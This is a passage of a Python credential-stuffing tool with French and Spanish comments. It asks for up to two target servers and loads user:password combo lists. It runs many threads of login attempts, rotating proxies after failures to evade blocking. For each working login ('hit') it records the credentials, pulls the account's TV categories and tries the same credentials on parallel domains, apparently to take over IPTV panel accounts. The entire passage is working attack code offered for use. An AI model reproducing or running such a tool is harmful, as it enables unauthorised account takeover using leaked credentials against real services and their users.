                try:
                    TW_DOMAIN = 10
                    TW_USER   = 5
                    TW_PASS   = 5

                    host = server.split(':')[0]
                    dom  = _shorten(host, TW_DOMAIN)
                    user = _shorten(hit_info["user"], TW_USER)
                    pwd  = _shorten(hit_info["pwd"],  TW_PASS)

                    line = f"http://{dom:<{TW_DOMAIN}} | {user:<{TW_USER}}- {pwd:<{TW_PASS}}"
                    if proxies_list:
                        line += " 🔄"  # Indicateur proxy
                    with _RESULTS_LOCK:
                        HIT_CASCADE.append(line)
                except Exception:
                    pass

                # --- enregistrement du hit + baseline catégories intelligentes ---
                with _RESULTS_LOCK:
                    _BASE_HITS.append(hit_info)
                    hit_id = f"{server}__{hit_info['user']}"
                    HITS_BY_ID[hit_id] = hit_info
                    HITS_BY_SERVER[server].append(hit_id)

                    need_baseline = (server not in BASELINE_CATS) or not BASELINE_CATS[server]
                    if need_baseline:
                        try:
                            base_timeout = int(TIMEOUTS.get("combo", 8)) if 'TIMEOUTS' in globals() else 8
                        except Exception:
                            base_timeout = 8

                        try:
                            _base_names = get_categories_with_fallback(
                                server, hit_info['user'], hit_info['pwd'],
                                timeout=_effective_timeout(base_timeout), limit=300
                            )
                        except Exception:
                            _base_names = []

                        try:
                            cats_set = _cats_to_set(_base_names)
                        except Exception:
                            cats_set = set()

                        BASELINE_CATS[server] = cats_set

                # --- mise à jour UI serveur ---
                try:
                    EMIT_Q.put(("server_update", server), block=False)
                except Exception:
                    pass

                # ✅ Recherche domaines parallèles SEULEMENT si on a des catégories TV
                try:
                    if BASELINE_CATS.get(server):
                        run_parallel_domains_for_server(
                            server, hit_info['user'], hit_info['pwd'], hit_info.get('port', '80')
                        )
                except Exception:
                    pass

            else:
                consecutive_fail_by_server[server] = consecutive_fail_by_server.get(server, 0) + 1
                if consecutive_fail_by_server[server] >= 3:
                    # Rotation de proxy sur échec - AVEC proxy_kind
                    if proxies_list:
                        thread_proxy = get_random_proxy(proxies_list, proxy_kind)
                        # [PROXY-UI] après rotation sur échec
                        with _display_lock:
                            CURRENT_PROXY_DISPLAY = _mask_proxy(thread_proxy) if thread_proxy else "—"
                            if thread_proxy:
                                PROXIES_USED_SET.add(CURRENT_PROXY_DISPLAY)
                    init_thread_fingerprint(server, thread_proxy)
                    consecutive_fail_by_server[server] = 0

            now = time.time()
            if ok or (now - last_draw) >= 0.20:
                try:
                    render_panel(combo_name, stats, total_checks, server_hits)
                except Exception:
                    pass
                last_draw = now

        finally:
            try:
                tasks_q.task_done()
            except Exception:
                pass                                                                
        # ===================== SAISIE SERVEURS/COMBOS =====================
def ask_servers():
    """Pide hasta 2 servidores para escanear"""
    global _blink_index
    for i in range(3):
        blink_color = _blink_colors[_blink_index % len(_blink_colors)]
        _blink_index += 1
        os.system('clear')
        print(blink_color + VEGETA_ASCII + '\x1b[0m')
        print('\x1b[1;33mIntroduce hasta 2 servidores para escanear↴ \x1b[0m')
        if i < 2:
            time.sleep(0.25)
    servers = []
    for i in range(1, 3):  # <= ici : seulement 2 serveurs
        try:
            s = input(f'\x1b[1;96mServidor {i} ➜ \x1b[1;33m').strip()
            print('\x1b[0m', end='')
            if s:
                servers.append(_strip_scheme(s))
        except (KeyboardInterrupt, EOFError):
            print("\n\x1b[1;33mSaisie interrompue.\x1b[0m")
            sys.exit(1)
        except Exception as e:
            print(f"\n\x1b[1;31mErreur de saisie: {e}\x1b[0m")
            continue
    return servers[:2] if servers else []
    
def choose_combo():
    """Permite al usuario elegir un archivo combo"""
    try:
        files = [f for f in os.listdir(COMBO_DIR) if os.path.isfile(os.path.join(COMBO_DIR, f))]
        if not files:
            print("\x1b[1;31mNo se encontró ningún archivo combo en la carpeta 'combo'.\x1b[0m")
            sys.exit(1)
        
        print("\n\x1b[1;34mArchivos combo disponibles:\x1b[0m")
        for i, f in enumerate(files, 1):
            print(f"\x1b[1;33m{i}➠ {f}  \x1b[0m")
        
        while True:
            try:
                choice = int(input("\n\x1b[1;96mElige un archivo ⚡Un Número⚡ ➜ \x1b[0;33m"))
                if 1 <= choice <= len(files):
                    combo_name = files[choice-1]
                    combo_path = os.path.join(COMBO_DIR, combo_name)
                    return combo_path, combo_name
                else:
                    print("\x1b[1;31mElección inválida.\x1b[0m")
            except ValueError:
                print("\x1b[1;31mPor favor ingresa un número.\x1b[0m")
            except (KeyboardInterrupt, EOFError):
                print("\n\x1b[1;31mEntrada interrumpida.\x1b[0m")
                sys.exit(1)
    except Exception as e:
        print(f"\x1b[1;31mError al seleccionar el combo: {e}\x1b[0m")
        sys.exit(1)

def load_items(combo_path):
    """Charge les combos user:password"""
    items = []
    try:
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line:
                    u, p = line.split(':', 1)
                    u = u.strip(); p = p.strip()
                    if u and p:
                        items.append((u, p))
    except Exception as e:
        print(f"\x1b[1;31mErreur lecture combo: {e}\x1b[0m")
    return items


# ===================== LISTEN 'h' CROSS-PLATFORM =====================
def _keyboard_listener_windows():
    # Windows: msvcrt.kbhit()/getch()
    try:
        import msvcrt
    except ImportError:
        return
    global _last_hit_message
    while not _stop_early.is_set():
        if msvcrt.kbhit():
            ch = msvcrt.getch()
            if not ch:
                continue

            # touche F = arrêt global (tout)
            if ch in (b'f', b'F'):
                _stop_early.set()
                _stop_parallel.set()
                _stop_combos.set()
                try:
                    _PARALLEL_DONE.set()
                except Exception:
                    pass
                for st in PARALLEL_SCANS.values():
                    try:
                        st.finished.set()
                    except Exception:
                        pass
                _last_hit_message = "⚠️ Arrêt global demandé (f)"
                break

            # touche V = arrêter uniquement les domaines parallèles (combos continuent)
            elif ch in (b'v', b'V'):
                for st in PARALLEL_SCANS.values():
                    try:
                        if getattr(st, "task_q", None):
                            _abort_parallel_group(st, st.task_q)
                        else:
                            st.finished.set()
                    except Exception:
                        pass
                _last_hit_message = "🛑 Domaines parallèles: arrêt immédiat (v)"

            # touche "1" = arrêter combos Escaneo #1 + attendre parallèles
            elif ch in (b'1',):
                _stop_combos_s1.set()
                _stop_after_parallel.set()
                _last_hit_message = "⛔ Escaneo #1: COMBOS DETENIDOS (1) – esperando dominios"

            # touche "2" = arrêter combos Escaneo #2 + attendre parallèles
            elif ch in (b'2',):
                _stop_combos_s2.set()
                _stop_after_parallel.set()
                _last_hit_message = "⛔ Escaneo #2: COMBOS DETENIDOS (2) – esperando dominios"

            # touche "P" = pause générale (combos + domaines)
            elif ch in (b'p', b'P'):
                _pause_scan.set()
                _last_hit_message = "⏸️ Pausa general ACTIVADA (P)"

            # touche "E" = reprise après pause
            elif ch in (b'e', b'E'):
                _pause_scan.clear()
                _last_hit_message = "▶️ Reanudado (E)"

        time.sleep(0.05)
                      
def _keyboard_listener_posix():
    # Linux / macOS / Termux (Android)
    import termios, tty, select
    fd = sys.stdin.fileno()
    if not sys.stdin.isatty():
        return
    old = termios.tcgetattr(fd)
    global _last_hit_message
    try:
        tty.setcbreak(fd)
        while not _stop_early.is_set():
            r, _, _ = select.select([sys.stdin], [], [], 0.1)
            if r:
                ch = sys.stdin.read(1)

                # F = arrêt global (tout)
                if ch and ch.lower() == 'f':
                    _stop_early.set()
                    _stop_parallel.set()
                    _stop_combos.set()
                    try:
                        _PARALLEL_DONE.set()
                    except Exception:
                        pass
                    for st in PARALLEL_SCANS.values():
                        try:
                            st.finished.set()
                        except Exception:
                            pass
                    _last_hit_message = "⚠️ Arrêt global demandé (f)"
                    break

                # V = arrêter uniquement les domaines parallèles (combos continuent)
                elif ch and ch.lower() == 'v':
                    for st in PARALLEL_SCANS.values():
                        try:
                            if getattr(st, "task_q", None):
                                _abort_parallel_group(st, st.task_q)
                            else:
                                st.finished.set()
                        except Exception:
                            pass
                    _last_hit_message = "🛑 Domaines parallèles: arrêt immédiat (v)"

                # 1 = arrêter combos Escaneo #1 + attendre parallèles
                elif ch == '1':
                    _stop_combos_s1.set()
                    _stop_after_parallel.set()
                    _last_hit_message = "⛔ Escaneo #1: COMBOS DETENIDOS (1) – esperando dominios"

                # 2 = arrêter combos Escaneo #2 + attendre parallèles
                elif ch == '2':
                    _stop_combos_s2.set()
                    _stop_after_parallel.set()
                    _last_hit_message = "⛔ Escaneo #2: COMBOS DETENIDOS (2) – esperando dominios"

                # P = pause générale
                elif ch and ch.lower() == 'p':
                    _pause_scan.set()
                    _last_hit_message = "⏸️ Pausa general ACTIVADA (P)"

                # E = reprise
                elif ch and ch.lower() == 'e':
                    _pause_scan.clear()
                    _last_hit_message = "▶️ Reanudado (E)"
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
                                                     
def start_keyboard_listener():
    # Démarre le bon listener selon la plateforme
    if os.name == 'nt':
        threading.Thread(target=_keyboard_listener_windows, daemon=True).start()
    else:
        threading.Thread(target=_keyboard_listener_posix, daemon=True).start()

# ===================== MAIN =====================
def main():
    try:
        # Limpiar pantalla + cursor arriba
        sys.stdout.write("\033[H\033[J"); sys.stdout.flush()

        # 1) Ingreso de servidores (hasta 2)
        servers = ask_servers()
        if not servers:
            print('\x1b[1;31m[ERROR]\x1b[0m Ningún servidor especificado.')
            return

        # === Mapeo de servidores a análisis (1 / 2) ===
        SERVER_INDEX.clear()
        for i, s in enumerate(servers[:2], start=1):
            SERVER_INDEX[s] = i

        # --- Watchers de estatuto (ping independiente tipo VΞNGΞANCΞ) ---
        global _SERVER_STATUS_WATCHERS
        try:
            for srv in servers:
                if not srv:
                    continue
                # evitar lanzar dos veces el mismo watcher
                if srv in _SERVER_STATUS_WATCHERS:
                    continue

                t = threading.Thread(
                    target=background_status_refresher,
                    args=(srv, 15, None),   # 15s, sin proxy para el ping de estado
                    daemon=True
                )
                _SERVER_STATUS_WATCHERS[srv] = t
                t.start()
        except Exception:
            pass

        # 2) Resumen DNS/Geo (aún sin proxy)
        try:
            sys.stdout.write("\033[H\033[J"); sys.stdout.flush()
            print(f"\x1b[1;96mResumen DNS/Geo de los objetivos:\x1b[0m\n")

            for s in servers:
                host = s.split(':')[0]
                port = s.split(':')[1] if ':' in s else '80'

                # IP + GEO
                ip = resolve_ip(host)
                if ip:
                    geo = geo_lookup(ip)
                    geo_txt = describe_geo(geo)  # contient déjà le drapeau
                else:
                    ip = "—"
                    geo_txt = "—"

                # Statut HTTP avec code réel (200, 401, 403, etc.)
                code = None
                status_txt = "OFFLINE"
                try:
                    url = f"http://{host}:{port}/"
                    resp = _simple_status_request(url, timeout=4.0)
                    if resp is not None:
                        code = getattr(resp, "status_code", None)
                except Exception:
                    code = None

                if code is None:
                    status_txt = "OFFLINE"
                else:
                    if 200 <= code < 300:
                        status_txt = "ONLINE"
                    # 🔁 404 traité comme redirection
                    elif 300 <= code < 400 or code == 404:
                        status_txt = "REDIRECT"
                    elif code in (401, 403):
                        status_txt = "PROTECTED"
                    elif 400 <= code < 500:
                        status_txt = "CLIENT_ERROR"
                    elif 500 <= code < 600:
                        status_txt = "SERVER_ERROR"
                    else:
                        status_txt = "HTTP"

                # Texte final affiché : 200 ONLINE, 403 PROTECTED, etc.
                if code is not None:
                    status_full = f"{code} {status_txt}"
                else:
                    status_full = status_txt

                # Couleur selon le statut
                label = status_txt.upper()
                if "ONLINE" in label:
                    st_colored = "\x1b[1;32m" + status_full + "\x1b[0m"
                elif "REDIRECT" in label:
                    st_colored = "\x1b[1;33m" + status_full + "\x1b[0m"
                elif "PROTECTED" in label:
                    st_colored = "\x1b[35m" + status_full + "\x1b[0m"
                elif "CLIENT_ERROR" in label or "SERVER_ERROR" in label or "HTTP" in label or "OFFLINE" in label:
                    st_colored = "\x1b[1;31m" + status_full + "\x1b[0m"
                else:
                    st_colored = "\x1b[37m" + status_full + "\x1b[0m"

                ip_str = ip or "—"

                # ── 4 lignes simples par servidor ──
                print(f"\x1b[90m  • http://{host}:{port}\x1b[0m")
                print(f"\x1b[90m    ↳ IP:\x1b[0m \x1b[1;31m{ip_str}\x1b[0m")
                print(f"\x1b[90m    ↳ Geo:\x1b[0m \x1b[90m{geo_txt}\x1b[0m")
                print(f"\x1b[90m    ↳ Estado HTTP➲ \x1b[0m{st_colored}\n")

            print("\x1b[90m(Elige ahora tu combo…)\x1b[0m\n")

            time.sleep(2.5)

        except Exception as _e:
            print(f"\x1b[33m[ADVERTENCIA]\x1b[0m Resumen DNS/Geo imposible: {_e}")

        # 3) Elección del combo (archivo de texto)
        combo_path, combo_name = choose_combo()

        # 4) Menú de proxy DESPUÉS de elegir combo
        sys.stdout.write("\033[H\033[J"); sys.stdout.flush()
        print("\x1b[1;33mVΞGΞТΛ⚡₸V — Configuración de proxy\x1b[0m\n")
        print("\x1b[1;96m¿Quieres usar proxys para el análisis?\x1b[0m")
        print("\x1b[1;33m1 = Sí (con proxy)")
        print("0 = No (escaneo directo)\x1b[0m\n")

        use_proxy = None
        while use_proxy is None:
            try:
                choice = input("\x1b[1;96mTu elección (0/1) ➜ \x1b[0;33m").strip()
                if choice == "1":
                    use_proxy = True
                elif choice == "0" or choice == "":
                    use_proxy = False
                else:
                    print("\x1b[1;31mElección inválida. Pulsa 1 para Sí o 0 para No.\x1b[0m")
            except (KeyboardInterrupt, EOFError):
                print("\n\x1b[1;33mEntrada interrumpida. Escaneo sin proxy.\x1b[0m")
                use_proxy = False
                break
            except Exception:
                print("\x1b[1;31mError de entrada. Escaneo sin proxy.\x1b[0m")
                use_proxy = False
                break

        # 5) Carga de proxys si se pidió - MODIFIÉ POUR PRENDRE proxy_kind
        proxies_list = []
        proxy_file_name = "Ninguno"
        proxy_path = None
        proxy_kind = None  # Variable pour stocker le type de proxy

        if use_proxy:
            proxy_path, proxy_kind = choose_proxy_file()  # ← Retourne maintenant (chemin, type)
            if proxy_path:
                proxies_list = load_proxies(proxy_path)
                proxy_file_name = os.path.basename(proxy_path) if proxies_list else "Ninguno"
            else:
                proxies_list = []
                proxy_file_name = "Ninguno"
                proxy_kind = None
                print("\x1b[1;33mEscaneo sin proxy.\x1b[0m")
        else:
            print("\x1b[1;33mEscaneo directo sin proxy.\x1b[0m")

        # 6) Carga del combo (aún sin panel)
        sys.stdout.write("\033[H\033[J"); sys.stdout.flush()
        items = load_items(combo_path)
        if not items:
            print('\x1b[1;31m[ERROR]\x1b[0m Combo vacío o inválido.')
            return

        # 7) Preparación de conteos (sin mostrar panel todavía)
        total_checks = len(items) * len(servers)
        stats = {'hits': 0, 'checks': 0, 'cpm': 0.0, 'start': time.time()}
        server_hits = {s: 0 for s in servers}

        # --- Init UI proxy para el panel ---
        global PROXY_FILE_NAME, PROXIES_TOTAL, PROXIES_USED_SET, CURRENT_PROXY_DISPLAY
        PROXY_FILE_NAME = proxy_file_name
        PROXIES_TOTAL = len(proxies_list)
        PROXIES_USED_SET = set()
        CURRENT_PROXY_DISPLAY = "—"

        # --- Arrancar watcher del archivo de proxy (si procede) ---
        try:
            if use_proxy and proxy_path and 'start_proxy_file_watcher' in globals():
                start_proxy_file_watcher(proxy_path, proxies_list, interval=2.0)
        except Exception:
            pass

        # 8) Pantalla de configuración rápida (con indicador de proxy)
        sys.stdout.write("\033[H\033[J"); sys.stdout.flush()
        proxy_indicator = " 🔄 " if proxies_list else ""
        print(f"\x1b[1;33mVΞGΞТΛ⚡₸V — Configuración rápida{proxy_indicator}\x1b[0m\n")
        print(f"\x1b[96mCombo seleccionado:\x1b[0m {combo_name}")

        if proxies_list:
            print(f"\x1b[96mProxy activo:\x1b[0m {proxy_file_name} ({len(proxies_list)} proxys)")
        else:
            print(f"\x1b[96mModo:\x1b[0m Escaneo directo sin proxy")

        try:
            _targets_preview = ", ".join(servers)
            if len(_targets_preview) > 100:
                _targets_preview = _targets_preview[:100] + "…"
            print(f"\x1b[96mObjetivos:\x1b[0m {_targets_preview}")
        except Exception:
            pass
        print(f"\x1b[96mTotal de pruebas previstas:\x1b[0m {total_checks}\n")

        # 9) Pregunta de hilos por servidor
        try:
            user_input = input("\x1b[36mCantidad de hilos por servidor (Enter=20) ➜ \x1b[0m").strip()
            if user_input == "":
                n_threads = 20
            else:
                n_threads = int(user_input)
        except Exception:
            n_threads = 20  # fallback

        if n_threads < 1:
            n_threads = 1
        cpu_default = (os.cpu_count() or 4) * 5
        max_cap     = max(1, min(total_checks, cpu_default * 2))

        if n_threads > max_cap:
            print(f"\x1b[33m[aviso]\x1b[0m Pediste \x1b[1;31m{n_threads}\x1b[0m hilos, "
                  f"se reducen a \x1b[1;33m{max_cap}\x1b[0m por seguridad.")
            n_threads = max_cap

        print(f"\x1b[1;90m➜ Hilos por servidor: \x1b[1;31m{n_threads}\x1b[0m\n")

        # 10) Dos colas separadas (por servidor)
        tasks_q_by_server = {s: queue.Queue() for s in servers}
        for s in servers:
            pairs = [(s, it) for it in items]
            random.shuffle(pairs)
            for pair in pairs:
                tasks_q_by_server[s].put(pair)

        # 11) Teclado + emisor + primer panel
        start_keyboard_listener()
        _start_emitter()

        sys.stdout.write("\033[H\033[J"); sys.stdout.flush()
        try:
            render_panel(combo_name, stats, total_checks, server_hits)
        except Exception:
            pass

        # 12) Pools dedicados
        pools = []
        for s in servers:
            scan_id = SERVER_INDEX.get(s, 1)
            for i in range(n_threads):
                t = threading.Thread(
                    target=worker,
                    args=(
                        i + 1,
                        tasks_q_by_server[s],
                        stats,
                        server_hits,
                        combo_name,
                        total_checks,
                        (0.08, 0.5),
                        scan_id,
                        proxies_list,
                        proxy_kind,
                    ),
                    daemon=True
                )
                t.start()
                pools.append(t)

        # 13) Espera fin de combos o tecla de parada
        while any(t.is_alive() for t in pools):
            if _stop_early.is_set():
                try:
                    for q in tasks_q_by_server.values():
                        while True:
                            _ = q.get_nowait()
                            q.task_done()
                except queue.Empty:
                    pass
                break

            try:
                render_panel(combo_name, stats, total_checks, server_hits)
            except Exception:
                pass
            time.sleep(0.2)

        for t in pools:
            try:
                t.join(timeout=0.1)
            except Exception:
                pass

        # 14) Esperar fin de dominios paralelos si 1/2 fue pulsado
        if _stop_after_parallel.is_set():
            while (
                any(s.started.is_set() and not s.finished.is_set() for s in PARALLEL_SCANS.values())
                or any(t.is_alive() for t in pools)
            ):
                if _stop_early.is_set():
                    break
                try:
                    render_panel(combo_name, stats, total_checks, server_hits)
                except Exception:
                    pass
                time.sleep(0.2)

        # 15) Panel final
        try:
            render_panel(combo_name, stats, total_checks, server_hits)
        except Exception:
            pass

        # 16) Resúmenes finales
        with _RESULTS_LOCK:
            if HITS_BY_SERVER:
                print("\n\x1b[1;32m✅ Resúmenes finales (panels):\x1b[0m\n")
                done_panels_servers = set()
                for server, hit_ids in HITS_BY_SERVER.items():
                    if not hit_ids:
                        continue
                    try:
                        first_hit = HITS_BY_ID.get(hit_ids[0], None)
                        if not first_hit:
                            continue
                        user = first_hit.get("user", "")
                        pwd  = first_hit.get("pwd", "")
                    except Exception:
                        continue

                    st = PARALLEL_SCANS.get(server)
                    per_server_parallels = sorted(set(st.results)) if (st and st.results) else []

                    server_key = server.replace(':', '_')
                    if server_key in done_panels_servers:
                        continue

                    try:
                        summary_txt = build_final_summary_block(
                            server, user, pwd, per_server_parallels
                        )
                        print(summary_txt)
                        save_panels(server_key, "\n" + summary_txt + "\n")
                        done_panels_servers.add(server_key)
                    except Exception as _e:
                        print(f"\n\x1b[33m[Aviso]\x1b[0m No se pudo generar el resumen final: {_e}\n")
            else:
                print("\n\x1b[33mNingún hit encontrado.\x1b[0m")

        try:
            EMIT_Q.join()
        except Exception:
            pass

        # --- Parar correctamente el watcher de proxy ---
        try:
            if 'stop_proxy_file_watcher' in globals():
                stop_proxy_file_watcher()
        except Exception:
            pass

        print(f'\n\x1b[1;32m✅ Terminado.\x1b[0m Resultados guardados en: {OUT_DIR}')

        # 17) Limpieza scans paralelos terminados
        try:
            for k, st in list(PARALLEL_SCANS.items()):
                if st.finished.is_set():
                    PARALLEL_SCANS.pop(k, None)
        except Exception:
            pass

        # 18) Reset contadores globales
        try:
            global _global_parallel_count, _global_parallels_seen
            _global_parallel_count = 0
            _global_parallels_seen.clear()
        except Exception:
            pass

        try:
            _stop_parallel.clear()
            _stop_combos.clear()
            _stop_after_parallel.clear()
        except Exception:
            pass

    except Exception as e:
        print(f'\n\x1b[1;31mError en main(): {e}\x1b[0m')
                                                       
    # ===================== LANCEMENT =====================
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        _stop_early.set()
        print('\n\x1b[1;31mInterrompu par l\'utilisateur.\x1b[0m')
    except Exception as e:
        print(f'\n\x1b[1;31mErreur inattendue: {e}\x1b[0m')